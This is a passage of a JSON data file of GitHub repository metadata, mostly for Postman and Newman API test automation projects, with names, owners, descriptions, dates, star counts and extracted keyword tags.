    "owner_id": 29831309,
    "owner_login": "CaiqueCoelho",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/29831309?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "tests",
      "tests ",
      "auto",
      "automat",
      "automation"
    ]
  },
  {
    "id": 189615046,
    "name": "postman-mapsApiAutomation",
    "full_name": "geotracsystems/postman-mapsApiAutomation",
    "description": "Contains Postman Collection for Maps API automation",
    "fork": false,
    "created_at": "2019-05-31T15:13:27Z",
    "updated_at": "2019-05-31T16:14:26Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 3578614,
    "owner_login": "geotracsystems",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/3578614?v=4",
    "pulled": 1,
    "tags": [
      "auto",
      "automat",
      "automation"
    ]
  },
  {
    "id": 211065956,
    "name": "api-testing-postman",
    "full_name": "umangbudhwar/api-testing-postman",
    "description": "Demo project for automating API testing.",
    "fork": false,
    "created_at": "2019-09-26T10:46:33Z",
    "updated_at": "2019-09-26T11:29:58Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 14281150,
    "owner_login": "umangbudhwar",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/14281150?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "testing",
      "auto",
      "automat",
      "automating"
    ]
  },
  {
    "id": 216082426,
    "name": "postman_api_v1",
    "full_name": "twilliamscsd/postman_api_v1",
    "description": null,
    "fork": false,
    "created_at": "2019-10-18T18:13:18Z",
    "updated_at": "2019-11-13T19:19:02Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 39810350,
    "owner_login": "twilliamscsd",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/39810350?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 239275721,
    "name": "api-testing-with-postman",
    "full_name": "defiant-dj04/api-testing-with-postman",
    "description": null,
    "fork": false,
    "created_at": "2020-02-09T09:11:41Z",
    "updated_at": "2020-02-16T18:13:13Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 33468586,
    "owner_login": "defiant-dj04",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/33468586?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 133872474,
    "name": "postman_backup_api_test",
    "full_name": "ivanryuu/postman_backup_api_test",
    "description": null,
    "fork": false,
    "created_at": "2018-05-17T21:57:04Z",
    "updated_at": "2020-03-29T12:01:04Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 3419886,
    "owner_login": "ivanryuu",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/3419886?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 98208954,
    "name": "api-postman-test",
    "full_name": "Isaiah-LeBlanc/api-postman-test",
    "description": null,
    "fork": false,
    "created_at": "2017-07-24T16:00:49Z",
    "updated_at": "2017-07-24T16:00:49Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 30326253,
    "owner_login": "Isaiah-LeBlanc",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/30326253?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 172527463,
    "name": "postman-api-systest",
    "full_name": "jimareed/postman-api-systest",
    "description": "Using postman and newman to create automated API system tests.",
    "fork": false,
    "created_at": "2019-02-25T15:03:22Z",
    "updated_at": "2019-02-26T12:40:06Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 10427510,
    "owner_login": "jimareed",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/10427510?v=4",
    "pulled": 1,
    "tags": [
      "test",
      " postman",
      "create",
      "tests",
      "auto",
      "automat",
      "newman",
      "system",
      "automate",
      "automated"
    ]
  },
  {
    "id": 166173907,
    "name": "newman-postman-api-jenkins",
    "full_name": "aldringithub/newman-postman-api-jenkins",
    "description": null,
    "fork": false,
    "created_at": "2019-01-17T06:39:02Z",
    "updated_at": "2019-01-17T06:39:02Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 46629417,
    "owner_login": "aldringithub",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/46629417?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 225457110,
    "name": "JavaApiAndPostman",
    "full_name": "leonardonasser/JavaApiAndPostman",
    "description": null,
    "fork": false,
    "created_at": "2019-12-02T19:56:08Z",
    "updated_at": "2019-12-03T14:45:33Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 57502285,
    "owner_login": "leonardonasser",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/57502285?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 247460142,
    "name": "POSTMAN-API-TESTING",
    "full_name": "manzooralam/POSTMAN-API-TESTING",
    "description": null,
    "fork": false,
    "created_at": "2020-03-15T12:15:51Z",
    "updated_at": "2020-03-15T15:08:15Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 40365917,
    "owner_login": "manzooralam",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/40365917?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 248580278,
    "name": "Postman_Automation_Api_collection",
    "full_name": "kerkeniakov/Postman_Automation_Api_collection",
    "description": "This is a collection of postman automated api tests for a polling app ",
    "fork": false,
    "created_at": "2020-03-19T18:48:16Z",
    "updated_at": "2020-03-19T18:58:16Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 28395932,
    "owner_login": "kerkeniakov",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/28395932?v=4",
    "pulled": 1,
    "tags": [
      "test",
      " postman",
      "collect",
      "collection",
      "tests",
      "tests ",
      "auto",
      "automat",
      "automate",
      "automated",
      "polling"
    ]
  },
  {
    "id": 88131332,
    "name": "oculo-api-postman",
    "full_name": "CERATechnologies/oculo-api-postman",
    "description": null,
    "fork": false,
    "created_at": "2017-04-13T06:14:41Z",
    "updated_at": "2017-04-13T06:14:41Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 12026055,
    "owner_login": "CERATechnologies",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/12026055?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 225734088,
    "name": "api-docker",
    "full_name": "chinu4104/api-docker",
    "description": "Postman-API test automation using docker",
    "fork": false,
    "created_at": "2019-12-03T23:02:46Z",
    "updated_at": "2019-12-15T18:58:29Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 57792300,
    "owner_login": "chinu4104",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/57792300?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "auto",
      "automat",
      "automation",
      "docker"
    ]
  },
  {
    "id": 94966256,
    "name": "APIs-Automation-test",
    "full_name": "shantu/APIs-Automation-test",
    "description": "Write automated tests for APIs using Postman",
    "fork": false,
    "created_at": "2017-06-21T05:28:58Z",
    "updated_at": "2017-06-21T05:28:58Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 1,
    "watchers": 0,
    "score": 1,
    "owner_id": 2716503,
    "owner_login": "shantu",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/2716503?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "tests",
      "tests ",
      "auto",
      "automat",
      "automate",
      "automated"
    ]
  },
  {
    "id": 203446801,
    "name": "CyberArk_EPM_Postman_Collection",
    "full_name": "seswho/CyberArk_EPM_Postman_Collection",
    "description": "The CyberArk Endpoint Privilege Manager Web Services enable you to automate tasks that are usually performed manually in the EPM console. Available for both on-premise and SaaS customers. Postman collection has documentation and examples",
    "fork": false,
    "created_at": "2019-08-20T20:07:36Z",
    "updated_at": "2020-02-14T13:52:19Z",
    "stargazers_count": 2,
    "watchers_count": 2,
    "forks": 1,
    "watchers": 2,
    "score": 1,
    "owner_id": 7858871,
    "owner_login": "seswho",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/7858871?v=4",
    "pulled": 1,
    "tags": [
      "collect",
      "collection",
      "form",
      "document",
      "auto",
      "example",
      "automat",
      "documentation",
      "perform",
      "automate",
      "task",
      "examples",
      "custom",
      "tasks",
      "enable",
      "console",
      "both",
      "customer",
      "customers",
      "manua",
      "usual",
      "performed"
    ]
  },
  {
    "id": 145001355,
    "name": "postman-collections",
    "full_name": "jaxxstone/postman-collections",
    "description": "copied from /grantorchard for testing vRA automation",
    "fork": false,
    "created_at": "2018-08-16T14:44:24Z",
    "updated_at": "2018-08-16T14:47:13Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 15974596,
    "owner_login": "jaxxstone",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/15974596?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "testing",
      "auto",
      "automat",
      "automation",
      "grant",
      "copied"
    ]
  },
  {
    "id": 159285492,
    "name": "Postman-Collection",
    "full_name": "DhrutiShahSparkle/Postman-Collection",
    "description": null,
    "fork": false,
    "created_at": "2018-11-27T06:14:52Z",
    "updated_at": "2018-11-27T06:25:57Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 45381904,
    "owner_login": "DhrutiShahSparkle",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/45381904?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 205661750,
    "name": "postman_collection",
    "full_name": "AndriiL/postman_collection",
    "description": null,
    "fork": false,
    "created_at": "2019-09-01T10:35:37Z",
    "updated_at": "2019-09-01T10:47:17Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 24550689,
    "owner_login": "AndriiL",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/24550689?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 235199266,
    "name": "Postman_Collection",
    "full_name": "TrosinaM/Postman_Collection",
    "description": null,
    "fork": false,
    "created_at": "2020-01-20T21:06:44Z",
    "updated_at": "2020-01-21T16:03:03Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 18024838,
    "owner_login": "TrosinaM",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/18024838?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 78666405,
    "name": "postman_collection_example",
    "full_name": "qaclub/postman_collection_example",
    "description": "Example of using postman collections for automating REST API testing",
    "fork": false,
    "created_at": "2017-01-11T18:21:30Z",
    "updated_at": "2017-01-11T18:21:30Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 19352771,
    "owner_login": "qaclub",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/19352771?v=4",
    "pulled": 1,
    "tags": [
      "test",
      " postman",
      "collect",
      "collection",
      "collections",
      "testing",
      "postman collection",
      "auto",
      "automat",
      "postman collections",
      "automating"
    ]
  },
  {
    "id": 170207066,
    "name": "connectall-postman-collections",
    "full_name": "dougbass/connectall-postman-collections",
    "description": null,
    "fork": false,
    "created_at": "2019-02-11T21:43:09Z",
    "updated_at": "2019-02-11T21:50:08Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 1144273,
    "owner_login": "dougbass",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/1144273?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 189625254,
    "name": "postman-collections-public",
    "full_name": "bgarlow/postman-collections-public",
    "description": null,
    "fork": false,
    "created_at": "2019-05-31T16:25:20Z",
    "updated_at": "2019-05-31T19:09:49Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 21367625,
    "owner_login": "bgarlow",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/21367625?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 167336847,
    "name": "postman-tfe-collection",
    "full_name": "nehrman/postman-tfe-collection",
    "description": null,
    "fork": false,
    "created_at": "2019-01-24T09:05:28Z",
    "updated_at": "2019-01-24T09:05:31Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 12544810,
    "owner_login": "nehrman",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/12544810?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 207670593,
    "name": "Postman-Collection-ARP",
    "full_name": "yzfvroom/Postman-Collection-ARP",
    "description": null,
    "fork": false,
    "created_at": "2019-09-10T21:59:18Z",
    "updated_at": "2019-09-18T23:13:28Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 38794887,
    "owner_login": "yzfvroom",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/38794887?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 206349498,
    "name": "amio-postman-collection",
    "full_name": "amio-io/amio-postman-collection",
    "description": null,
    "fork": false,
    "created_at": "2019-09-04T15:16:47Z",
    "updated_at": "2020-01-13T09:37:02Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 13884288,
    "owner_login": "amio-io",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/13884288?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 224880563,
    "name": "Onboarding.Postman.Collection",
    "full_name": "YouLend/Onboarding.Postman.Collection",
    "description": null,
    "fork": false,
    "created_at": "2019-11-29T15:39:38Z",
    "updated_at": "2019-11-29T15:39:38Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 58297271,
    "owner_login": "YouLend",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/58297271?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 248604257,
    "name": "Postman-test-collection",
    "full_name": "atanasovpld/Postman-test-collection",
    "description": null,
    "fork": false,
    "created_at": "2020-03-19T21:01:50Z",
    "updated_at": "2020-03-19T21:01:53Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 62113693,
    "owner_login": "atanasovpld",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/62113693?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 219912470,
    "name": "HarverExercise",
    "full_name": "Himaz1/HarverExercise",
    "description": "This includes Postman results and REST API automation framework",
    "fork": false,
    "created_at": "2019-11-06T04:34:57Z",
    "updated_at": "2019-11-06T04:39:20Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 39479047,
    "owner_login": "Himaz1",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/39479047?v=4",
    "pulled": 1,
    "tags": [
      "auto",
      "automat",
      "framework",
      "automation",
      "result",
      "includes",
      "results"
    ]
  },
  {
    "id": 117334839,
    "name": "playground-newman",
    "full_name": "domahidizoltan/playground-newman",
    "description": "Playing with Rest API test automation with Postman/Newman",
    "fork": false,
    "created_at": "2018-01-13T10:33:04Z",
    "updated_at": "2019-08-01T08:39:18Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 1,
    "watchers": 0,
    "score": 1,
    "owner_id": 2330530,
    "owner_login": "domahidizoltan",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/2330530?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "auto",
      "automat",
      "automation"
    ]
  },
  {
    "id": 24961556,
    "name": "automationbypostman",
    "full_name": "taralshah007/automationbypostman",
    "description": "This is an example how we can create automation of REST API using postman(Chrome extension)",
    "fork": false,
    "created_at": "2014-10-08T21:21:17Z",
    "updated_at": "2014-10-08T21:21:17Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 9094135,
    "owner_login": "taralshah007",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/9094135?v=4",
    "pulled": 1,
    "tags": [
      " postman",
      "create",
      "auto",
      "example",
      "automat",
      "extension",
      "automation"
    ]
  },
  {
    "id": 207350189,
    "name": "Simple-REST-API-using-Spring-Boot-Hibernate-and-MySQL-Database",
    "full_name": "andreprawira/Simple-REST-API-using-Spring-Boot-Hibernate-and-MySQL-Database",
    "description": "It's a very simple REST API for employee management using Spring Boot, Hibernate, and MySQL.  Test it with Postman:  Use GET method to list all of the employees or a single employee specified by ID Use POST method to save an employee (ID auto generated) or use a PUT method to update if employee ID already exist (specify the employee ID in the url to update) Use DELETE method to delete an employee (specify the employee ID in the url to delete) Dont forget to change the application.properties to connect the database with the app (located in src/main/resources/application.properties)",
    "fork": false,
    "created_at": "2019-09-09T16:08:07Z",
    "updated_at": "2019-09-09T16:08:17Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 42351199,
    "owner_login": "andreprawira",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/42351199?v=4",
    "pulled": 1,
    "tags": [
      "data",
      "application",
      "database",
      "auto",
      "generate",
      "manage",
      "spec",
      "list",
      "source",
      "read",
      "update",
      "connect",
      "delete",
      "very",
      "method",
      "resource",
      "management",
      "main",
      "resources",
      "ready",
      "generated",
      "single",
      "employee",
      "forge",
      "properties",
      "employees"
    ]
  },
  {
    "id": 152831850,
    "name": "nimble",
    "full_name": "flyingeinstein/nimble",
    "description": "Arduino IoT multi-sensor for the ESP8266. Supports a number of popular sensors. Simply wire sensors to the ESP8266 and compile this sketch. Use the Http Rest API (Postman collection provided) to configure and control the sensors and direct sensor data to a number of targets such as Influx for analytics or a home automation controller.",
    "fork": false,
    "created_at": "2018-10-13T03:36:47Z",
    "updated_at": "2019-09-04T16:49:58Z",
    "stargazers_count": 1,
    "watchers_count": 1,
    "forks": 0,
    "watchers": 1,
    "score": 1,
    "owner_id": 8076078,
    "owner_login": "flyingeinstein",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/8076078?v=4",
    "pulled": 1,
    "tags": [
      "collect",
      "collection",
      "data",
      "auto",
      "automat",
      "config",
      "provide",
      "automation",
      "control",
      "provided",
      "controller",
      "popular",
      "such",
      "gets",
      "configure",
      "home",
      "analytics"
    ]
  },
  {
    "id": 239401706,
    "name": "prueba_meta",
    "full_name": "neomarmedina/prueba_meta",
    "description": "Prueba de la empresa MetaData : Crear un proyecto público en git (gitlab, github...) y compartirnos la url.  Crear un proyecto API/Rest en Laravel 6 con los sig requerimientos:  - PHP 7.3. - Base de datos Mysql 5 utf8mb4_unicode_ci llamada \"prueba_meta\".  Crear Servicio tipo POST que registre un modelo \"Author\" con el atributo \"name\"  Crear Servicio tipo POST que registre un modelo \"Book\" con los atributos \"publish_date\", \"title\", \"author_id\"  Crear un servicio tipo GET que retorne un listado de los \"Book\" y sus autores.  Crear las migraciones correspondientes para ambos modelos. (https://laravel.com/docs/6.x/migrations)  Los servicios deben devolver sus respuestas en formato JSON y tener validaciones para sus atributos usando \"Validator\" (https://laravel.com/docs/6.x/validation) e implementar \"Eloquent: API Resources\" (https://laravel.com/docs/6.x/eloquent-resources).  Los servicios serán probados en Postman después de levantar el servidor (php artisan serve) y colocadas las variables de entorno en el archivo .env  ",
    "fork": false,
    "created_at": "2020-02-10T01:13:22Z",
    "updated_at": "2020-02-10T03:00:09Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 20566173,
    "owner_login": "neomarmedina",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/20566173?v=4",
    "pulled": 1,
    "tags": [
      "form",
      "http",
      "auto",
      "code",
      "implement",
      "format",
      "auth",
      "https",
      "list",
      "source",
      "name",
      "github",
      "resource",
      "model",
      "laravel",
      "docs",
      "resources",
      "variable",
      "validation",
      "usando",
      "variables",
      "title",
      "gitlab",
      "servicio",
      "prueba",
      "proyecto",
      "empresa",
      "servidor",
      "partir"
    ]
  },
  {
    "id": 132346522,
    "name": "postmanTest",
    "full_name": "piokrajewski/postmanTest",
    "description": "Basic setup of automation test process with jenkins+newman+postman",
    "fork": false,
    "created_at": "2018-05-06T14:32:04Z",
    "updated_at": "2018-05-15T10:50:04Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 26937424,
    "owner_login": "piokrajewski",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/26937424?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "auto",
      "automat",
      "newman",
      "automation",
      "setup",
      "process",
      "jenkins"
    ]
  },
  {
    "id": 125899562,
    "name": "PostmanTest",
    "full_name": "juantor16/PostmanTest",
    "description": null,
    "fork": false,
    "created_at": "2018-03-19T18:01:15Z",
    "updated_at": "2018-03-19T18:07:12Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 10635675,
    "owner_login": "juantor16",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/10635675?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 250383709,
    "name": "PostmanTests",
    "full_name": "Chupa14142/PostmanTests",
    "description": null,
    "fork": false,
    "created_at": "2020-03-26T22:15:45Z",
    "updated_at": "2020-03-27T01:45:25Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 42383706,
    "owner_login": "Chupa14142",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/42383706?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 204883314,
    "name": "PostmanTest",
    "full_name": "JoaquinGomezCabido/PostmanTest",
    "description": null,
    "fork": false,
    "created_at": "2019-08-28T08:23:05Z",
    "updated_at": "2019-08-28T08:23:08Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 52210795,
    "owner_login": "JoaquinGomezCabido",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/52210795?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 133698405,
    "name": "testing_continues",
    "full_name": "luisg18997/testing_continues",
    "description": "practica de testing automatizado con postman, newman, jmeter y jenkins",
    "fork": false,
    "created_at": "2018-05-16T17:00:39Z",
    "updated_at": "2019-05-04T23:36:56Z",
    "stargazers_count": 2,
    "watchers_count": 2,
    "forks": 0,
    "watchers": 2,
    "score": 1,
    "owner_id": 26290370,
    "owner_login": "luisg18997",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/26290370?v=4",
    "pulled": 1,
    "tags": [
      "test",
      " postman",
      "testing",
      "auto",
      "automat",
      "newman",
      "jenkins",
      "jmeter",
      "automatizado",
      "practica"
    ]
  },
  {
    "id": 78614306,
    "name": "PostmanTest",
    "full_name": "kiranwilson/PostmanTest",
    "description": null,
    "fork": false,
    "created_at": "2017-01-11T07:35:37Z",
    "updated_at": "2017-01-11T07:35:37Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 25051117,
    "owner_login": "kiranwilson",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/25051117?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 87941001,
    "name": "postmanTest",
    "full_name": "gkielar/postmanTest",
    "description": null,
    "fork": false,
    "created_at": "2017-04-11T14:02:09Z",
    "updated_at": "2018-03-27T14:19:33Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 27288223,
    "owner_login": "gkielar",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/27288223?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 116050891,
    "name": "PostmanTest",
    "full_name": "Mohsen3p200/PostmanTest",
    "description": null,
    "fork": false,
    "created_at": "2018-01-02T19:45:51Z",
    "updated_at": "2018-01-02T19:45:51Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 26491836,
    "owner_login": "Mohsen3p200",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/26491836?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 239682309,
    "name": "PostmanTests",
    "full_name": "santhiparambalam/PostmanTests",
    "description": null,
    "fork": false,
    "created_at": "2020-02-11T05:17:02Z",
    "updated_at": "2020-02-11T08:32:09Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 45686927,
    "owner_login": "santhiparambalam",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/45686927?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 141481909,
    "name": "PostmanAutomation",
    "full_name": "shanthalarb/PostmanAutomation",
    "description": "This repository has postman automation tests ",
    "fork": false,
    "created_at": "2018-07-18T19:39:01Z",
    "updated_at": "2018-07-18T19:40:40Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 41392923,
    "owner_login": "shanthalarb",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/41392923?v=4",
    "pulled": 1,
    "tags": [
      "test",
      " postman",
      "repo",
      "repos",
      "repository",
      "tests",
      "tests ",
      "auto",
      "automat",
      "automation"
    ]
  },
  {
    "id": 228446057,
    "name": "postman-backend-testing",
    "full_name": "bestchanges/postman-backend-testing",
    "description": "Example of how to implement HTTP API automation testing using Postman and Newman",
    "fork": false,
    "created_at": "2019-12-16T18:07:00Z",
    "updated_at": "2019-12-17T14:00:55Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 9627923,
    "owner_login": "bestchanges",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/9627923?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "testing",
      "auto",
      "automat",
      "implement",
      "automation"
    ]
  },
  {
    "id": 217800881,
    "name": "testes-automatizados-postman",
    "full_name": "treslebr/testes-automatizados-postman",
    "description": "Projeto no Postman para a realização de testes automatizados. ",
    "fork": false,
    "created_at": "2019-10-27T03:37:36Z",
    "updated_at": "2019-11-03T22:56:57Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 49782587,
    "owner_login": "treslebr",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/49782587?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "auto",
      "automat",
      "testes",
      "realiza",
      "automatizado",
      "automatizados"
    ]
  },
  {
    "id": 91855340,
    "name": "testes-postman-backend",
    "full_name": "nildowjunior-projetos/testes-postman-backend",
    "description": null,
    "fork": false,
    "created_at": "2017-05-20T00:39:28Z",
    "updated_at": "2017-05-20T00:39:28Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 19480988,
    "owner_login": "nildowjunior-projetos",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/19480988?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 169629898,
    "name": "PostManTest",
    "full_name": "Fearonz/PostManTest",
    "description": null,
    "fork": false,
    "created_at": "2019-02-07T19:32:32Z",
    "updated_at": "2019-02-07T19:32:35Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 25453268,
    "owner_login": "Fearonz",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/25453268?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 170326381,
    "name": "PostManTest",
    "full_name": "S00083446/PostManTest",
    "description": null,
    "fork": false,
    "created_at": "2019-02-12T13:51:46Z",
    "updated_at": "2019-02-12T13:51:46Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 25453228,
    "owner_login": "S00083446",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/25453228?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 226247375,
    "name": "Postman_and_Newman_Testing",
    "full_name": "msayin/Postman_and_Newman_Testing",
    "description": null,
    "fork": false,
    "created_at": "2019-12-06T04:44:36Z",
    "updated_at": "2019-12-06T04:44:36Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 57653430,
    "owner_login": "msayin",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/57653430?v=4",
    "pulled": 1,
